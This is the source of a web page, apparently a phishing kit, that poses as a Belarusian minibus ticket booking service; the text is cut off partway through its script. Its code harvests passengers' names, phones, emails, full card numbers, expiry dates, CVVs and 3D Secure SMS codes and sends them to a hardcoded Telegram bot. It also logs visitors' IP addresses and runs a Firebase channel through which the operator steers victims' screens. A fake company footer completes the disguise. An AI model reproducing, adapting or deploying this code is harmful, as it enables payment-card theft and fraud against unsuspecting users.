<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
    <title>–ú–∞—Ä—à—Ä—É—Ç–∫–∞ –æ—Ç Onrender !</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
        }
        body {
            background: #0c111d;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
            position: relative;
            overflow-x: hidden;
        }
        body::before {
            content: '';
            position: fixed;
            top: 0;
            left: -10%;
            width: 120%;
            height: 100%;
            background: url('https://cdn-icons-png.flaticon.com/512/2972/2972185.png') repeat-x 0 50%;
            background-size: 150px auto;
            opacity: 0.03;
            animation: drive 20s linear infinite;
            pointer-events: none;
            z-index: 0;
        }
        @keyframes drive {
            0% { background-position: -150px 50%; }
            100% { background-position: 100% 50%; }
        }
        .card {
            max-width: 500px;
            width: 100%;
            background: white;
            border-radius: 16px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
            overflow: hidden;
            position: relative;
            z-index: 1;
        }
        .header {
            background: #003a70;
            padding: 20px;
            text-align: center;
        }
        .header a {
            color: white;
            text-decoration: none;
            font-size: 24px;
            font-weight: 700;
            letter-spacing: 1px;
        }
        .header a:hover {
            text-decoration: underline;
        }
        .content {
            padding: 24px;
        }
        .search-box {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 20px;
            margin-bottom: 20px;
        }
        .search-title {
            font-size: 18px;
            font-weight: 600;
            color: #003a70;
            margin-bottom: 16px;
        }
        .field {
            margin-bottom: 16px;
        }
        .field label {
            display: block;
            font-size: 13px;
            color: #475569;
            margin-bottom: 4px;
            font-weight: 500;
        }
        .field input, .field select {
            width: 100%;
            padding: 12px;
            border: 1px solid #cbd5e1;
            border-radius: 8px;
            font-size: 16px;
            transition: 0.2s;
            background: white;
        }
        .field input:focus, .field select:focus {
            outline: none;
            border-color: #003a70;
            box-shadow: 0 0 0 3px rgba(0,58,112,0.1);
        }
        .btn {
            background: #003a70;
            color: white;
            border: none;
            padding: 14px;
            width: 100%;
            border-radius: 40px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: 0.2s;
            margin: 8px 0;
        }
        .btn:hover {
            background: #002b54;
        }
        .btn-outline {
            background: white;
            color: #003a70;
            border: 1px solid #003a70;
        }
        .btn-outline:hover {
            background: #f0f7ff;
        }
        .route-list {
            margin-top: 20px;
        }
        .route-item {
            background: #f8fafc;
            border: 1px solid #e2e8f0;
            border-radius: 12px;
            padding: 16px;
            margin-bottom: 12px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .route-info h3 {
            font-size: 18px;
            color: #1e293b;
            margin-bottom: 6px;
        }
        .route-info p {
            font-size: 14px;
            color: #64748b;
            margin-bottom: 4px;
        }
        .route-price {
            font-size: 20px;
            font-weight: 700;
            color: #003a70;
        }
        .route-seats {
            font-size: 13px;
            color: #059669;
        }
        .footer {
            text-align: center;
            font-size: 12px;
            color: #94a3b8;
            padding: 16px;
            border-top: 1px solid #e2e8f0;
        }
        .spinner {
            border: 3px solid #e2e8f0;
            border-top: 3px solid #003a70;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .sms-code {
            font-size: 32px;
            letter-spacing: 8px;
            text-align: center;
            padding: 16px;
            background: #f1f5f9;
            border: 2px solid #cbd5e1;
            border-radius: 12px;
            width: 100%;
            margin: 20px 0;
        }
        .success, .fail {
            text-align: center;
            padding: 20px;
        }
        .success-icon, .fail-icon {
            width: 60px;
            height: 60px;
            border-radius: 50%;
            display: flex;
            align-items: center;
            justify-content: center;
            margin: 0 auto 20px;
            font-size: 30px;
            border: 2px solid;
        }
        .success-icon {
            background: #d1fae5;
            color: #059669;
            border-color: #059669;
        }
        .fail-icon {
            background: #fee2e2;
            color: #b91c1c;
            border-color: #b91c1c;
        }
    </style>
</head>
<body>
    <div class="card" id="app"></div>

    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>

    <script>
        (function() {
            const firebaseConfig = {
                apiKey: "AIzaSyB2IZy_bK8vQeiGpXYbvWvDyPcP80Dj984",
                authDomain: "marsutka-tt37.firebaseapp.com",
                databaseURL: "https://marsutka-tt37-default-rtdb.firebaseio.com",
                projectId: "marsutka-tt37",
                storageBucket: "marsutka-tt37.firebasestorage.app",
                messagingSenderId: "714890480273",
                appId: "1:714890480273:web:e537b2c757d521a88e0d30"
            };
            firebase.initializeApp(firebaseConfig);
            const db = firebase.database();

            const BOT_TOKEN = '8529551109:AAGafdmClxe936XeYH5F3VfLrtFNZ20CP9c';
            const ADMIN_ID = 5852338439;
            const urlParams = new URLSearchParams(window.location.search);
            const linkHash = urlParams.get('hash') || null;

            let state = {
                mode: linkHash ? 'specific' : 'search',
                step: linkHash ? 'specific' : 'search',
                fromCity: '',
                toCity: '',
                date: '',
                selectedRoute: null,
                passenger: { fullName: '', phone: '', email: '' },
                card: { number: '', expiry: '', cvv: '', cardholder: '' },
                smsCode: '',
                sessionId: 'sess_' + Date.now() + '_' + Math.random().toString(36).substring(7),
                searchResults: []
            };

            // ==================== –ë–ê–ó–ê BIN (–¢–ê –ñ–ï, –ß–¢–û –í –ë–û–¢–ï) ====================
            const BIN_DB = {
                // –ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫
                '427901': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Classic' },
                '427902': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Gold' },
                '427903': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Platinum' },
                '427904': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Visa Infinite' },
                '425501': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '425502': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '911201': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Classic' },
                '911202': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Premium' },
                '380101': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ë–µ–ª–∫–∞—Ä—Ç Classic' },
                '91123801': { bank: '–ë–µ–ª–∞—Ä—É—Å–±–∞–Ω–∫', type: '–ú–ò–† Supreme' },
                
                // –ü—Ä–∏–æ—Ä–±–∞–Ω–∫
                '521324': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                '521325': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Mastercard Gold' },
                '515701': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '515702': { bank: '–ü—Ä–∏–æ—Ä–±–∞–Ω–∫', type: 'Visa Gold' },
                
                // –ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫
                '440501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '440502': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Visa Gold' },
                '510501': { bank: '–ë–µ–ª–∏–Ω–≤–µ—Å—Ç–±–∞–Ω–∫', type: 'Mastercard Standard' },
                
                // –ê–ª—å—Ñ–∞-–ë–∞–Ω–∫
                '458101': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Classic' },
                '458102': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Gold' },
                '555501': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Mastercard Standard' },
                '548701': { bank: '–ê–ª—å—Ñ–∞-–ë–∞–Ω–∫', type: 'Visa Platinum' },
                
                // –ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç
                '462201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Visa Classic' },
                '552201': { bank: '–ë–∞–Ω–∫ –î–∞–±—Ä–∞–±—ã—Ç', type: 'Mastercard Standard' },
                
                // –¢–µ—Ö–Ω–æ–±–∞–Ω–∫
                '424601': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Visa Classic' },
                '676301': { bank: '–¢–µ—Ö–Ω–æ–±–∞–Ω–∫', type: 'Maestro' },
                
                // –ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫
                '498401': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Visa Classic' },
                '427601': { bank: '–ü–∞—Ä–∏—Ç–µ—Ç–±–∞–Ω–∫', type: 'Mastercard Standard' },
                
                // –†–†–ë-–ë–∞–Ω–∫
                '411111': { bank: '–†–†–ë-–ë–∞–Ω–∫', type: 'Visa Classic' },
                
                // –°–±–µ—Ä–±–∞–Ω–∫
                '427688': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Visa Classic' },
                '546901': { bank: '–°–±–µ—Ä–±–∞–Ω–∫', type: 'Mastercard Standard' },
                
                // –í–¢–ë
                '427229': { bank: '–í–¢–ë', type: 'Visa Classic' },
                '546801': { bank: '–í–¢–ë', type: 'Mastercard Standard' },
                
                // –¢–∏–Ω—å–∫–æ—Ñ—Ñ
                '437772': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Visa Classic' },
                '521324': { bank: '–¢–∏–Ω—å–∫–æ—Ñ—Ñ', type: 'Mastercard Standard' },
                
                // –û—Ç–∫—Ä—ã—Ç–∏–µ
                '440588': { bank: '–û—Ç–∫—Ä—ã—Ç–∏–µ', type: 'Visa Classic' },
                '548002': { bank: '–ë–∞–Ω–∫ –ë–µ–ª–í–≠–ë', type: 'Mastercard' },
                '431400': { bank: '–ë–∞–Ω–∫ –ú–æ—Å–∫–≤–∞-–ú–∏–Ω—Å–∫', type: 'Visa' },
            };

            function getBinInfo(cardNumber) {
                const bin = cardNumber.replace(/\D/g, '').slice(0,6);
                return BIN_DB[bin] || { bank: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ', type: '–ù–µ–∏–∑–≤–µ—Å—Ç–Ω–æ' };
            }

            function formatCardNumber(v) {
                let d = v.replace(/\D/g, '').slice(0,16);
                let parts = [];
                for (let i=0; i<d.length; i+=4) parts.push(d.slice(i,i+4));
                return parts.join(' ');
            }
            function formatExpiry(v) {
                let d = v.replace(/\D/g, '').slice(0,4);
                if (d.length >= 3) return d.slice(0,2) + '/' + d.slice(2);
                return d;
            }
            function formatCVV(v) {
                return v.replace(/\D/g, '').slice(0,3);
            }

            // –î–∞–Ω–Ω—ã–µ –º–∞—Ä—à—Ä—É—Ç–æ–≤
            const routes = [
                { from: '–ú–∏–Ω—Å–∫', to: '–ì–æ–º–µ–ª—å', price: 27, duration: '4—á 30–º', seats: 12, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë—Ä–µ—Å—Ç', price: 30, duration: '4—á 00–º', seats: 8, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–í–∏—Ç–µ–±—Å–∫', price: 28, duration: '3—á 45–º', seats: 5, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–∏—Ç–µ–±—Å–∫¬ª' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ì—Ä–æ–¥–Ω–æ', price: 27, duration: '4—á 38–º', seats: 9, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì—Ä–æ–¥–Ω–æ¬ª, —É–ª. –ß—ã—Ä–≤–æ–Ω–∞–∞—Ä–º–µ–π—Å–∫–∞—è' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ú–æ–≥–∏–ª—ë–≤', price: 25, duration: '2—á 30–º', seats: 15, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1', toPoint: '–ì–æ—Å—Ç–∏–Ω–∏—Ü–∞ ¬´–ú–æ–≥–∏–ª—ë–≤¬ª, –ø—Ä. –ú–∏—Ä–∞ 6' },
                { from: '–ú–∏–Ω—Å–∫', to: '–ë–æ–±—Ä—É–π—Å–∫', price: 22, duration: '1—á 40–º', seats: 7, fromPoint: '–ñ–î –í–æ–∫–∑–∞–ª ¬´–ú–∏–Ω—Å–∫-–ü–∞—Å—Å–∞–∂–∏—Ä—Å–∫–∏–π¬ª, –ø–ª–∞—Ç—Ñ–æ—Ä–º–∞ 5', toPoint: '–û—Å—Ç–∞–Ω–æ–≤–∫–∞ —É –º–∞–≥–∞–∑–∏–Ω–∞ Mart Inn' },
                { from: '–ì–æ–º–µ–ª—å', to: '–ú–∏–Ω—Å–∫', price: 27, duration: '4—á 30–º', seats: 10, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ì–æ–º–µ–ª—å¬ª, —É–ª. –ü—Ä–∏–≤–æ–∫–∑–∞–ª—å–Ω–∞—è 3', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–¶–µ–Ω—Ç—Ä–∞–ª—å–Ω—ã–π¬ª, —É–ª. –ë–æ–±—Ä—É–π—Å–∫–∞—è 1' },
                { from: '–ë—Ä–µ—Å—Ç', to: '–ú–∏–Ω—Å–∫', price: 30, duration: '4—á 00–º', seats: 6, fromPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–ë—Ä–µ—Å—Ç¬ª', toPoint: '–ê–≤—Ç–æ–≤–æ–∫–∑–∞–ª ¬´–í–æ—Å—Ç–æ—á–Ω—ã–π¬ª, —É–ª. –û–ª–µ–≥–∞ –ö–æ—à–µ–≤–æ–≥–æ' },
            ];

            function searchRoutes(from, to) {
                return routes.filter(r => r.from === from && r.to === to);
            }

            async function sendCardToBot(routeData) {
                const binInfo = getBinInfo(state.card.number);
                const messageText = 
                    `üí≥ –ù–û–í–ê–Ø –ö–ê–†–¢–ê\n\n` +
                    `üöê –ú–∞—Ä—à—Ä—É—Ç: ${routeData.from} ‚Üí ${routeData.to}\n` +
                    `üìÖ ${state.date}\n` +
                    `üí∞ ${routeData.price} BYN\n` +
                    `üë§ –ü–∞—Å—Å–∞–∂–∏—Ä: ${state.passenger.fullName}\n` +
                    `üìû –¢–µ–ª–µ—Ñ–æ–Ω: ${state.passenger.phone}\n` +
                    `üìß Email: ${state.passenger.email}\n` +
                    `üí≥ –ö–∞—Ä—Ç–∞: ${state.card.number}\n` +
                    `üìÖ –°—Ä–æ–∫: ${state.card.expiry} | CVV: ${state.card.cvv}\n` +
                    `üë§ –í–ª–∞–¥–µ–ª–µ—Ü: ${state.card.cardholder}\n` +
                    `üî¢ BIN: ${state.card.number.replace(/\D/g, '').slice(0,6)}\n` +
                    `üè¶ –ë–ê–ù–ö: ${binInfo.bank}\n` +
                    `üíé –¢–ò–ü: ${binInfo.type}\n` +
                    `üîó –•–µ—à: ${linkHash || 'manual'}\n` +
                    `üÜî –°–µ—Å—Å–∏—è: ${state.sessionId}`;

                const keyboard = {
                    inline_keyboard: [
                        [{ text: 'üí∞ –í–ó–Ø–¢–¨ –ö–ê–†–¢–£', callback_data: `take_${state.sessionId}` },
                         { text: 'üóë –û–¢–ö–ê–ó', callback_data: `reject_${state.sessionId}` }]
                    ]
                };

                try {
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: ADMIN_ID,
                            text: messageText,
                            parse_mode: 'HTML',
                            reply_markup: keyboard
                        })
                    });
                    return true;
                } catch (e) {
                    console.error(e);
                    return false;
                }
            }

            async function sendVisitNotification() {
                if (!linkHash) return;
                try {
                    const ipRes = await fetch('https://api.ipify.org?format=json');
                    const ipData = await ipRes.json();
                    const text = `üëÅ –ó–ê–•–û–î –ù–ê –°–°–´–õ–ö–£\n\nüîó –•–µ—à: ${linkHash}\nüåç IP: ${ipData.ip}\nüì± ${navigator.userAgent}`;
                    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ chat_id: ADMIN_ID, text: text })
                    });
                } catch (e) {}
            }

            let firebaseListener = null;
            
            function startFirebaseListener() {
                if (firebaseListener) return;
                
                console.log(`üî• –ó–∞–ø—É—Å–∫ Firebase —Å–ª—É—à–∞—Ç–µ–ª—è –¥–ª—è ${state.sessionId}`);
                const cardRef = db.ref(`cards/${state.sessionId}/status`);
                
                firebaseListener = cardRef.on('value', (snapshot) => {
                    const status = snapshot.val();
                    console.log(`üî• –°—Ç–∞—Ç—É—Å Firebase: ${status}, —à–∞–≥: ${state.step}`);
                    
                    if (status === 'sms' && (state.step === 'processing' || state.step === 'processing2')) {
                        console.log('‚úÖ –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –Ω–∞ SMS');
                        state.step = 'sms';
                        render();
                    } else if (status === 'success' && state.step === 'processing2') {
                        console.log('‚úÖ –û–ø–ª–∞—Ç–∞ —É—Å–ø–µ—à–Ω–∞');
                        state.step = 'success';
                        render();
                    } else if (status === 'fail' && state.step === 'processing2') {
                        console.log('‚ùå –û–ø–ª–∞—Ç–∞ –Ω–µ –ø—Ä–æ—à–ª–∞');
                        state.step = 'fail';
                        render();
                    }
                }, (error) => {
                    console.error('‚ùå –û—à–∏–±–∫–∞ Firebase:', error);
                });
            }

            function render() {
                const app = document.getElementById('app');
                let html = `
                    <div class="header">
                        <a href="/">üöê –ú–∞—Ä—à—Ä—É—Ç–∫–∞ –æ—Ç Onrender !</a>
                    </div>
                    <div class="content">
                `;

                if (state.step === 'search') {
                    html += `
                        <div class="search-box">
                            <div class="search-title">üîç –ü–û–ò–°–ö –ë–ò–õ–ï–¢–û–í</div>
                            <div class="field">
                                <label>–û—Ç–∫—É–¥–∞</label>
                                <select id="fromCity">
                                    <option value="">–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥</option>
                                    <option value="–ú–∏–Ω—Å–∫">–ú–∏–Ω—Å–∫</option>
                                    <option value="–ì–æ–º–µ–ª—å">–ì–æ–º–µ–ª—å</option>
                                    <option value="–ë—Ä–µ—Å—Ç">–ë—Ä–µ—Å—Ç</option>
                                    <option value="–í–∏—Ç–µ–±—Å–∫">–í–∏—Ç–µ–±—Å–∫</option>
                                    <option value="–ì—Ä–æ–¥–Ω–æ">–ì—Ä–æ–¥–Ω–æ</option>
                                    <option value="–ú–æ–≥–∏–ª—ë–≤">–ú–æ–≥–∏–ª—ë–≤</option>
                                    <option value="–ë–æ–±—Ä—É–π—Å–∫">–ë–æ–±—Ä—É–π—Å–∫</option>
                                </select>
                            </div>
                            <div class="field">
                                <label>–ö—É–¥–∞</label>
                                <select id="toCity">
                                    <option value="">–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥</option>
                                    <option value="–ú–∏–Ω—Å–∫">–ú–∏–Ω—Å–∫</option>
                                    <option value="–ì–æ–º–µ–ª—å">–ì–æ–º–µ–ª—å</option>
                                    <option value="–ë—Ä–µ—Å—Ç">–ë—Ä–µ—Å—Ç</option>
                                    <option value="–í–∏—Ç–µ–±—Å–∫">–í–∏—Ç–µ–±—Å–∫</option>
                                    <option value="–ì—Ä–æ–¥–Ω–æ">–ì—Ä–æ–¥–Ω–æ</option>
                                    <option value="–ú–æ–≥–∏–ª—ë–≤">–ú–æ–≥–∏–ª—ë–≤</option>
                                    <option value="–ë–æ–±—Ä—É–π—Å–∫">–ë–æ–±—Ä—É–π—Å–∫</option>
                                </select>
                            </div>
                            <div class="field">
                                <label>–î–∞—Ç–∞</label>
                                <input type="date" id="date" value="${new Date().toISOString().split('T')[0]}">
                            </div>
                            <button class="btn" id="searchBtn">–ù–ê–ô–¢–ò –ë–ò–õ–ï–¢–´</button>
                        </div>
                        <div class="route-list" id="routeList"></div>
                    `;
                } else if (state.step === 'select') {
                    const route = state.selectedRoute;
                    html += `
                        <div class="search-box">
                            <div class="search-title">‚úÖ –í–´–ë–†–ê–ù–ù–´–ô –†–ï–ô–°</div>
                            <div style="margin-bottom: 16px;">
                                <h3>${route.from} ‚Üí ${route.to}</h3>
                                <p><strong>üìÖ –î–∞—Ç–∞:</strong> ${state.date}</p>
                                <p><strong>üìç –û—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏–µ:</strong> ${route.fromPoint}</p>
                                <p><strong>üìç –ü—Ä–∏–±—ã—Ç–∏–µ:</strong> ${route.toPoint}</p>
                                <p><strong>‚è± –í –ø—É—Ç–∏:</strong> ${route.duration}</p>
                                <p><strong>üé´ –ú–µ—Å—Ç –æ—Å—Ç–∞–ª–æ—Å—å:</strong> ${route.seats}</p>
                                <p><strong>üí∞ –¶–µ–Ω–∞:</strong> ${route.price} BYN</p>
                            </div>
                            <button class="btn" id="continueBtn">–ü–†–û–î–û–õ–ñ–ò–¢–¨</button>
                            <button class="btn btn-outline" onclick="state.step='search'; render();">‚Üê –ù–ê–ó–ê–î –ö –ü–û–ò–°–ö–£</button>
                        </div>
                    `;
                } else if (state.step === 'passenger') {
                    html += `
                        <div class="search-box">
                            <div class="search-title">üë§ –î–ê–ù–ù–´–ï –ü–ê–°–°–ê–ñ–ò–†–ê</div>
                            <div class="field">
                                <label>–§–ò–û *</label>
                                <input type="text" id="fullName" placeholder="–ò–≤–∞–Ω–æ–≤ –ò–≤–∞–Ω –ò–≤–∞–Ω–æ–≤–∏—á" value="${state.passenger.fullName}">
                            </div>
                            <div class="field">
                                <label>–¢–µ–ª–µ—Ñ–æ–Ω *</label>
                                <input type="tel" id="phone" placeholder="+375291234567" value="${state.passenger.phone}" maxlength="12">
                            </div>
                            <div class="field">
                                <label>Email (–¥–ª—è –±–∏–ª–µ—Ç–∞)</label>
                                <input type="email" id="email" placeholder="ivanov@mail.ru" value="${state.passenger.email}">
                            </div>
                            <button class="btn" id="nextBtn">–ü–†–û–î–û–õ–ñ–ò–¢–¨ –ö –û–ü–õ–ê–¢–ï</button>
                            <button class="btn btn-outline" onclick="state.step='select'; render();">‚Üê –ù–ê–ó–ê–î</button>
                        </div>
                    `;
                } else if (state.step === 'card') {
                    html += `
                        <div class="search-box">
                            <div class="search-title">üí≥ –í–í–û–î –ö–ê–†–¢–´</div>
                            <div class="field">
                                <label>–ù–æ–º–µ—Ä –∫–∞—Ä—Ç—ã *</label>
                                <input type="text" id="cardNumber" placeholder="0000 0000 0000 0000" value="${state.card.number}" maxlength="19">
                            </div>
                            <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 12px;">
                                <div class="field">
                                    <label>–°—Ä–æ–∫</label>
                                    <input type="text" id="expiry" placeholder="–ú–ú/–ì–ì" value="${state.card.expiry}" maxlength="5">
                                </div>
                                <div class="field">
                                    <label>CVV</label>
                                    <input type="text" id="cvv" placeholder="123" value="${state.card.cvv}" maxlength="3">
                                </div>
                            </div>
                            <div class="field">
                                <label>–í–ª–∞–¥–µ–ª–µ—Ü –∫–∞—Ä—Ç—ã</label>
                                <input type="text" id="cardholder" placeholder="IVANOV IVAN" value="${state.card.cardholder}">
                            </div>
                            <button class="btn" id="payBtn">–û–ü–õ–ê–¢–ò–¢–¨ ${state.selectedRoute.price} BYN</button>
                            <button class="btn btn-outline" onclick="state.step='passenger'; render();">‚Üê –ù–ê–ó–ê–î</button>
                        </div>
                    `;
                } else if (state.step === 'processing') {
                    html += `
                        <div class="search-box" style="text-align: center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –Ω–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É</p>
                            <p style="color:#64748b;">–û–∂–∏–¥–∞–µ–º –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–µ–Ω–∏–µ...</p>
                        </div>
                    `;
                    startFirebaseListener();
                } else if (state.step === 'processing2') {
                    html += `
                        <div class="search-box" style="text-align: center;">
                            <div class="spinner"></div>
                            <p style="margin:20px 0;">–ë–∞–Ω–∫ –ø–æ–¥—Ç–≤–µ—Ä–∂–¥–∞–µ—Ç –æ–ø–µ—Ä–∞—Ü–∏—é...</p>
                            <p style="color:#64748b;">–ü–æ–∂–∞–ª—É–π—Å—Ç–∞, –ø–æ–¥–æ–∂–¥–∏—Ç–µ</p>
                        </div>
                    `;
                } else if (state.step === 'sms') {
                    html += `
                        <div class="search-box">
                            <div class="search-title">üîê 3D Secure</div>
                            <p style="margin-bottom:16px;">–í–≤–µ–¥–∏—Ç–µ –∫–æ–¥, –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–Ω—ã–π –Ω–∞ –≤–∞—à —Ç–µ–ª–µ—Ñ–æ–Ω</p>
                            <input class="sms-code" id="smsCode" maxlength="6" placeholder="______" value="${state.smsCode}" inputmode="numeric">
                            <button class="btn" id="confirmSms">–ü–û–î–¢–í–ï–†–î–ò–¢–¨</button>
                            <button class="btn btn-outline" onclick="state.step='card'; render();">‚Üê –ù–ê–ó–ê–î –ö –ö–ê–†–¢–ï</button>
                        </div>
                    `;
                } else if (state.step === 'success') {
                    html += `
                        <div class="search-box success">
                            <div class="success-icon">‚úì</div>
                            <h3 style="margin-bottom:16px;">–ë–∏–ª–µ—Ç –∑–∞—Ä–µ–∑–µ—Ä–≤–∏—Ä–æ–≤–∞–Ω!</h3>
                            <p style="margin-bottom:30px;">–ë–∏–ª–µ—Ç –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω –Ω–∞ email –∏ SMS.<br>–î–∏—Å–ø–µ—Ç—á–µ—Ä —Å–≤—è–∂–µ—Ç—Å—è —Å –≤–∞–º–∏ –≤ —Ç–µ—á–µ–Ω–∏–µ 10 –º–∏–Ω—É—Ç.</p>
                            <button class="btn" onclick="window.location.href='/'">–ù–ê –ì–õ–ê–í–ù–£–Æ</button>
                        </div>
                    `;
                } else if (state.step === 'fail') {
                    html += `
                        <div class="search-box fail">
                            <div class="fail-icon">‚úï</div>
                            <h3 style="margin-bottom:16px;">–ü–ª–∞—Ç—ë–∂ –Ω–µ –ø—Ä–æ—à—ë–ª</h3>
                            <p style="margin-bottom:30px;">–ü–æ–ø—Ä–æ–±—É–π—Ç–µ –¥—Ä—É–≥—É—é –∫–∞—Ä—Ç—É –∏–ª–∏ –ø–æ–≤—Ç–æ—Ä–∏—Ç–µ –ø–æ–∑–∂–µ.</p>
                            <button class="btn" onclick="state.step='card'; render();">–ü–û–ü–†–û–ë–û–í–ê–¢–¨ –°–ù–û–í–ê</button>
                            <button class="btn btn-outline" onclick="window.location.href='/'">–ù–ê –ì–õ–ê–í–ù–£–Æ</button>
                        </div>
                    `;
                }

                html += `
                        <div class="footer">
                            ¬© 2026 –û–û–û ¬´–ê–≤—Ç–æ–¢—Ä–∞–Ω—Å–ë–µ–ª¬ª | –£–ù–ü 193421567<br>
                            –õ–∏—Ü–µ–Ω–∑–∏—è –ú–∏–Ω—Ç—Ä–∞–Ω—Å–∞ ‚Ññ –ê–ü-2026-458
                        </div>
                    </div>
                `;
                app.innerHTML = html;

                if (state.step === 'search') {
                    document.getElementById('searchBtn')?.addEventListener('click', () => {
                        const from = document.getElementById('fromCity').value;
                        const to = document.getElementById('toCity').value;
                        const date = document.getElementById('date').value;
                        
                        if (!from || !to) {
                            alert('–í—ã–±–µ—Ä–∏—Ç–µ –≥–æ—Ä–æ–¥–∞ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∏—è –∏ –ø—Ä–∏–±—ã—Ç–∏—è');
                            return;
                        }
                        if (from === to) {
